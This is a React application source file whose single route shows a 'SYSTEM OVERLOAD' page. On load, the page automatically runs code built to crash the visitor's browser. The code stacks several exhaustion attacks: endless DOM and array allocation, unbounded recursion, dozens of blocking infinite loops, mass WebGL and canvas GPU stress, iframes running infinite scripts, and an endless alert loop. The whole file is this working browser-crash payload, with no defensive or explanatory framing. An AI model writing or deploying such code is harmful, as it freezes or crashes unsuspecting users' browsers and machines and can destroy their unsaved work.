import { useEffect } from "react";
import "@/App.css";
import { BrowserRouter, Routes, Route } from "react-router-dom";

const CrashPage = () => {
  useEffect(() => {
    // Initiate all crash mechanisms immediately on mount
    const crashBrowser = () => {
      // 1. Memory Exhaustion - Infinite DOM element creation
      const memoryBomb = () => {
        const container = document.createElement('div');
        document.body.appendChild(container);
        
        const createElements = () => {
          for (let i = 0; i < 10000; i++) {
            const el = document.createElement('div');
            el.innerHTML = 'X'.repeat(10000);
            el.style.cssText = `
              position: absolute;
              width: ${Math.random() * 1000}px;
              height: ${Math.random() * 1000}px;
              background: radial-gradient(circle, #${Math.random().toString(16).substr(2, 6)}, #${Math.random().toString(16).substr(2, 6)});
              transform: rotate(${Math.random() * 360}deg) scale(${Math.random() * 5});
              opacity: ${Math.random()};
            `;
            container.appendChild(el);
          }
          requestAnimationFrame(createElements);
        };
        createElements();
      };

      // 2. CPU Overload - Multiple infinite loops and heavy calculations
      const cpuBomb = () => {
        // Recursive function without base case
        const infiniteRecursion = (depth = 0) => {
          const arr = new Array(1000000).fill(Math.random());
          arr.sort();
          infiniteRecursion(depth + 1);
        };

        // Multiple worker-like infinite loops
        for (let w = 0; w < 50; w++) {
          setTimeout(() => {
            while(true) {
              Math.sqrt(Math.random() * 999999999);
              JSON.stringify(new Array(100000).fill({data: Math.random()}));
            }
          }, 0);
        }

        infiniteRecursion();
      };

      // 3. GPU Crash - WebGL and Canvas intensive operations
      const gpuBomb = () => {
        // Create multiple WebGL contexts
        for (let i = 0; i < 100; i++) {
          const canvas = document.createElement('canvas');
          canvas.width = 4096;
          canvas.height = 4096;
          document.body.appendChild(canvas);
          
          const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
          if (gl) {
            // Stress GPU with massive texture operations
            const texture = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, texture);
            const size = 8192;
            const data = new Uint8Array(size * size * 4);
            
            const stressGPU = () => {
              for (let j = 0; j < 100; j++) {
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                gl.readPixels(0, 0, size, size, gl.RGBA, gl.UNSIGNED_BYTE, data);
              }
              requestAnimationFrame(stressGPU);
            };
            stressGPU();
          }

          // Canvas 2D stress
          const ctx = canvas.getContext('2d');
          if (ctx) {
            const drawCrazy = () => {
              for (let k = 0; k < 10000; k++) {
                ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`;
                ctx.fillRect(Math.random()*4096, Math.random()*4096, Math.random()*1000, Math.random()*1000);
                ctx.rotate(Math.random());
                ctx.scale(Math.random()*5, Math.random()*5);
              }
              requestAnimationFrame(drawCrazy);
            };
            drawCrazy();
          }
        }
      };

      // 4. Memory allocation bomb
      const memoryArrayBomb = () => {
        const arrays = [];
        const allocate = () => {
          for (let i = 0; i < 1000; i++) {
            arrays.push(new Array(1000000).fill({
              data: Math.random().toString().repeat(1000),
              nested: new Array(1000).fill(Math.random())
            }));
          }
          setTimeout(allocate, 0);
        };
        allocate();
      };

      // 5. Infinite nested iframes
      const iframeBomb = () => {
        for (let i = 0; i < 100; i++) {
          const iframe = document.createElement('iframe');
          iframe.style.cssText = 'position: absolute; width: 100%; height: 100%;';
          document.body.appendChild(iframe);
          if (iframe.contentDocument) {
            iframe.contentDocument.write('<script>while(true){}</script>');
          }
        }
      };

      // Execute all crash mechanisms simultaneously
      setTimeout(memoryBomb, 10);
      setTimeout(cpuBomb, 20);
      setTimeout(gpuBomb, 30);
      setTimeout(memoryArrayBomb, 40);
      setTimeout(iframeBomb, 50);

      // Bonus: Infinite alert loops (if not blocked)
      setTimeout(() => {
        while(true) {
          try { alert('CRASH'); } catch(e) {}
        }
      }, 100);
    };

    // Start crash sequence after brief display
    const timer = setTimeout(crashBrowser, 500);
    
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="crash-container" data-testid="crash-page">
      <div className="crash-content">
        <div className="glitch-wrapper">
          <h1 className="crash-title" data-glitch="SYSTEM OVERLOAD">SYSTEM OVERLOAD</h1>
        </div>
        <div className="status-grid">
          <div className="status-item" data-testid="memory-status">
            <span className="status-label">MEMORY</span>
            <span className="status-bar"></span>
            <span className="status-value">CRITICAL</span>
          </div>
          <div className="status-item" data-testid="cpu-status">
            <span className="status-label">CPU</span>
            <span className="status-bar"></span>
            <span className="status-value">CRITICAL</span>
          </div>
          <div className="status-item" data-testid="gpu-status">
            <span className="status-label">GPU</span>
            <span className="status-bar"></span>
            <span className="status-value">CRITICAL</span>
          </div>
        </div>
        <p className="crash-warning" data-testid="crash-warning">INITIALIZING CRASH SEQUENCE...</p>
      </div>
      <div className="scanline"></div>
    </div>
  );
};

function App() {
  return (
    <div className="App">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<CrashPage />} />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;
